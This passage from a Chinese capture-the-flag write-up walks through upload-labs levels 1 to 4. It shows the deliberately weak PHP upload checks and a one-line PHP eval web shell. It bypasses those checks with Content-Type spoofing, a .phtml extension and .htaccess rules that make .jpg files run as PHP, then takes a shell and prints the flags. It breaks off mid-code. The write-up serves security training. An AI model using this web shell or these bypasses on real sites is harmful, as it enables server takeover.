single-quoted-string">'upload_file'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token keyword type-declaration">null</span> <span class="token operator">||</span> <span class="token class-name">file</span> <span class="token operator">==</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"请选择要上传的文件!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//定义允许上传的文件类型</span>    <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string double-quoted-string">".jpg|.png|.gif"</span><span class="token punctuation">;</span>    <span class="token comment">//提取上传文件的类型</span>    <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token operator">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token operator">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//判断上传文件类型是否允许上传</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token operator">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name <span class="token operator">+</span> <span class="token string double-quoted-string">"|"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token string double-quoted-string">"该文件不允许上传，请上传"</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token string double-quoted-string">"类型的文件,当前文件类型为："</span> <span class="token operator">+</span> ext_name<span class="token punctuation">;</span>        <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>源代码表明，本关仅仅在前端用js做了一下后缀名的检测，所以只要借助代理工具这种检测是非常容易绕过的；此外除了接住代理工具，直接修改前端的js代码也是可以的，前端js在客户端的浏览器运行，是完全可以由攻击者进行控制的。</p><p>所以，这种在前端做的文件安全性检测是最容易被攻破的，基本上不存在安全性可言。</p><h1 id="二、Pass-02（后端检测MIME）"><a href="#二、Pass-02（后端检测MIME）" class="headerlink" title="二、Pass-02（后端检测MIME）"></a>二、Pass-02（后端检测MIME）</h1><h2 id="2-1-题面"><a href="#2-1-题面" class="headerlink" title="2.1 题面"></a>2.1 题面</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-15%2017.50.34.png" style="zoom:50%;"><h2 id="2-2-解题"><a href="#2-2-解题" class="headerlink" title="2.2 解题"></a>2.2 解题</h2><ul><li>直接上传yjh.php，提示文件类型不正确。</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-02%2017.44.42.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-15%2017.51.41.png" style="zoom:50%;"><ul><li>抓包</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-15%2017.53.07.png" style="zoom:50%;"><ul><li>尝试修改Content-Type绕过</li></ul><blockquote><h4 id="Content-Type知多少"><a href="#Content-Type知多少" class="headerlink" title="Content-Type知多少"></a>Content-Type知多少</h4><p><code>Content-Type</code> 是一个 HTTP 头部字段，用于指示资源的媒体类型（MIME 类型）。以下是一些常见的 <code>Content-Type</code> 类型：</p><p>文本类型</p><ul><li><strong>text/plain</strong>：纯文本格式，如文本文件、日志文件等。它不包含任何格式化信息，只包含字符数据。</li><li><strong>text/html</strong>：HTML 文档，用于网页的结构和内容描述。浏览器会解析 HTML 代码来渲染网页的布局、文本、图片等元素。</li><li><strong>text/css</strong>：CSS 样式表，用于定义 HTML 文档的样式，如字体、颜色、布局等。它可以使网页具有美观的视觉效果。</li><li><strong>text/javascript</strong>：JavaScript 脚本，用于实现网页的交互功能，如响应用户操作、动态更新内容等。不过在现代开发中，更推荐使用 <code>application/javascript</code>。</li></ul><p>图像类型</p><ul><li><strong>image/jpeg</strong>：JPEG 图像格式，是一种常用的有损压缩图像格式，适用于彩色照片等图像，能够在保持一定图像质量的情况下减小文件大小。</li><li><strong>image/png</strong>：PNG 图像格式，是一种无损压缩的位图图像格式，支持透明度，适用于图标、徽标等需要透明背景的图像。</li><li><strong>image/gif</strong>：GIF 图像格式，支持动画和透明度，常用于简单的动画效果，如加载动画、表情图标等。不过它的颜色深度有限，最多只能支持 256 种颜色。</li><li><strong>image/svg+xml</strong>：SVG 图像格式，是一种基于 XML 的矢量图像格式，图像可以无限放大而不失真，适用于图标、图表等需要高分辨率和可缩放的图像。</li></ul><p>应用程序类型</p><ul><li><strong>application/json</strong>：JSON 数据格式，是一种轻量级的数据交换格式，易于阅读和编写，也易于机器解析和生成，广泛应用于 Web 开发中的数据传输，如 AJAX 请求的响应数据、API 接口的返回数据等。</li><li><strong>application/xml</strong>：XML 数据格式，是一种可扩展的标记语言，用于数据的存储和传输，具有良好的结构性和可扩展性，常用于配置文件、数据交换等场景。</li><li><strong>application/pdf</strong>：PDF 文件格式，是一种广泛使用的文档格式，可以包含文本、图像、表格、超链接等多种元素，具有较好的兼容性和可打印性，适用于电子文档的展示、分享和打印。</li><li><strong>application/zip</strong>：ZIP 压缩文件格式，用于将多个文件或文件夹压缩成一个文件，便于存储和传输，可以有效减小文件体积，节省存储空间和传输时间。</li></ul></blockquote><p>果然，上传成功。</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-15%2017.56.22.png" style="zoom:50%;"><p>getshell</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-15%2017.57.56.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-15%2017.58.28.png" style="zoom:50%;"><p>Flag:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>a44d95b2-084c-4996-9510-5c0b8704e067<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-3-代码审计"><a href="#2-3-代码审计" class="headerlink" title="2.3 代码审计"></a>2.3 代码审计</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-15%2017.59.31.png" style="zoom:50%;"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'文件类型不正确，请重新上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>分析：</p><p>当表单提交时，首先检查上传路径是否存在。若存在，再判断上传文件类型是否为 JPEG、PNG 或 GIF 图像。若是，将临时文件移动到指定路径，上传成功则 <code>$is_upload</code> 设为 <code>true</code>，否则 <code>$msg</code> 显示“上传出错！”。若文件类型不符，显示“文件类型不正确，请重新上传！”。</p><p>若上传路径不存在，提示手工创建该路径。</p></blockquote><p>归根结底是判断MIME类型，但是这个类型是客户端可控的，可以随意修改，这样以来后端的检测限制可以被轻松绕过，检测失去了意义。</p><h1 id="三、Pass-03（后端后缀名黑名单检测）"><a href="#三、Pass-03（后端后缀名黑名单检测）" class="headerlink" title="三、Pass-03（后端后缀名黑名单检测）"></a>三、Pass-03（后端后缀名黑名单检测）</h1><h2 id="3-1-题面"><a href="#3-1-题面" class="headerlink" title="3.1 题面"></a>3.1 题面</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.11.45.png" style="zoom:50%;"><p>还是上传webshell。</p><h2 id="3-2-解题"><a href="#3-2-解题" class="headerlink" title="3.2 解题"></a>3.2 解题</h2><p>直接上传yjh.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sxk'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.13.59.png" style="zoom:50%;"><ul><li>尝试修改MIME类型，还是上传失败。</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.16.32.png" style="zoom:50%;"><p>判断可能是在后端用了后缀名黑名单。</p><ul><li>尝试大小写绕过失败。</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.18.48.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.19.28.png" alt="截屏2025-01-17 17.19.28" style="zoom:50%;"><ul><li>尝试使用特殊后缀绕过</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.26.46.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.27.37.png" style="zoom:50%;"><p>使用php5后缀，访问发现没有被解析执行。</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.29.28.png" style="zoom:50%;"><ul><li>在文件名后面添加空格绕过失败</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.40.12.png" alt="添加空格绕过失败" style="zoom:50%;"><p>使用<code>phtml</code>时貌似被解析执行了。</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.30.00.png" style="zoom:50%;"><p>蚁剑getshell：</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.30.53.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.31.37.png" style="zoom:80%;"><p>Flag:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>a3820578-6bcc-4b5c-afe9-b5ba026aa81c<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-3-代码审计"><a href="#3-3-代码审计" class="headerlink" title="3.3 代码审计"></a>3.3 代码审计</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.33.11.png" style="zoom:50%;"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.asp'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.aspx'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//收尾去空</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li><strong>文件夹存在性检查</strong>：首先判断<code>UPLOAD_PATH</code>指定的文件夹是否存在，若不存在则提示手工创建。</li><li><strong>黑名单定义</strong>：定义了一个<code>$deny_ext</code>数组，包含禁止上传的文件后缀<code>.asp</code>、<code>.aspx</code>、<code>.php</code>、<code>.jsp</code>。</li><li><strong>文件名处理</strong>：获取上传文件的名称，并通过<code>deldot</code>函数删除文件名末尾的点，然后通过<code>strrchr</code>函数获取文件扩展名，并转换为小写，去除字符串<code>::$DATA</code>，最后收尾去空。</li><li><strong>后缀名检查</strong>：判断处理后的文件扩展名是否在黑名单数组中，若不在则执行文件上传操作，将临时文件移动到指定路径；若在黑名单中则提示不允许上传该后缀文件。</li></ul></blockquote><h1 id="四、Pass-04（后端后缀名“大”黑名单检测）"><a href="#四、Pass-04（后端后缀名“大”黑名单检测）" class="headerlink" title="四、Pass-04（后端后缀名“大”黑名单检测）"></a>四、Pass-04（后端后缀名“大”黑名单检测）</h1><h2 id="4-1-题面"><a href="#4-1-题面" class="headerlink" title="4.1 题面"></a>4.1 题面</h2><p>和之前一样。</p><h2 id="4-2-解题"><a href="#4-2-解题" class="headerlink" title="4.2 解题"></a>4.2 解题</h2><ul><li>直接上传yjh.php</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.47.44.png" style="zoom:50%;"><p>提示，此文件不允许上传。</p><ul><li>修改 Content-Type: image/jpeg 尝试绕过失败。</li><li>+后缀名改成.phtml，绕过失败</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.50.38.png" style="zoom:50%;"><ul><li>直接改成jpg</li></ul><p>这意味这放弃了通过直接上传脚本让服务端解析执行，后续可能需要结合文件包含漏洞利用。</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.52.40.png" style="zoom:50%;"><p>成功上传了，说明并没有检测文件内容（通常是检测文件头）。</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2017.58.44.png" style="zoom:50%;"><ul><li>尝试上传.htaccess文件覆盖服务端配置，使其将jpg文件当作php脚本解析。</li></ul><blockquote><p>要通过<code>.htaccess</code>文件将<code>.jpg</code>文件当作PHP脚本解析，可以使用以下几种配置方法：</p><h4 id="方法一：使用AddType指令"><a href="#方法一：使用AddType指令" class="headerlink" title="方法一：使用AddType指令"></a>方法一：使用<code>AddType</code>指令</h4><p>这是最直接的方法，通过<code>AddType</code>指令将<code>.jpg</code>文件的MIME类型设置为PHP脚本的类型，从而让Apache服务器将其当作PHP文件解析。</p><p>apache复制</p><pre class="line-numbers language-apache" data-language="apache"><code class="language-apache">AddType application/x-httpd-php .jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将上述代码添加到<code>.htaccess</code>文件中，上传的<code>.jpg</code>文件就会被当作PHP文件执行。</p><h4 id="方法二：使用指令"><a href="#方法二：使用指令" class="headerlink" title="方法二：使用<FilesMatch>指令"></a>方法二：使用<code>&lt;FilesMatch&gt;</code>指令</h4><p>这种方法可以更精确地控制哪些文件被当作PHP脚本解析，同时还可以添加一些额外的安全措施或配置。</p><p>apache复制</p><pre class="line-numbers language-apache" data-language="apache"><code class="language-apache">&lt;FilesMatch "\.jpg$"&gt;    SetHandler application/x-httpd-php&lt;/FilesMatch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这段代码使用<code>&lt;FilesMatch&gt;</code>指令匹配以<code>.jpg</code>结尾的文件，并通过<code>SetHandler</code>指令将这些文件的处理方式设置为PHP脚本的处理方式。</p><h4 id="方法三：使用AddHandler指令"><a href="#方法三：使用AddHandler指令" class="headerlink" title="方法三：使用AddHandler指令"></a>方法三：使用<code>AddHandler</code>指令</h4><p><code>AddHandler</code>指令也可以用来将特定文件后缀的文件与特定的处理器关联起来，从而实现文件解析的重写。</p><p>apache复制</p><pre class="line-numbers language-apache" data-language="apache"><code class="language-apache">AddHandler application/x-httpd-php .jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这行代码的作用与<code>AddType</code>指令类似，但<code>AddHandler</code>在某些配置环境下可能更加灵活。</p><ol><li><strong>服务器配置</strong>：确保服务器的配置允许<code>.htaccess</code>文件中的这些指令生效。有些服务器可能出于安全考虑禁用了<code>.htaccess</code>文件的某些功能。</li><li><strong>权限问题</strong>：确保你有权限上传并修改<code>.htaccess</code>文件，以及服务器的配置允许<code>.htaccess</code>文件覆盖主配置文件中的设置。</li></ol></blockquote><p>为了查看方便（mac上默认不显示.开头的隐藏文件，懒的配置了）写入了htaccess文件，上传的时候改一下文件名就可以。</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2018.01.12.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2018.06.27.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2018.07.10.png" style="zoom:50%;"><p>再次访问上传的图片，发现没有加载图片失败的情况，判断时.htaccess文件生效了。</p><p>蚁剑getshell</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2018.08.36.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2018.08.58.png" alt="截屏2025-01-17 18.08.58" style="zoom:50%;"><p>成功获取到flag：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>f58c7bc4-bf87-40e7-8949-9b8608560e74<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-3-代码审计"><a href="#4-3-代码审计" class="headerlink" title="4.3 代码审计"></a>4.3 代码审计</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2018.10.12.png" style="zoom:50%;"><p>黑名单ban掉了非常多的后缀，想寻找一个没被ban掉的挺难的。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token 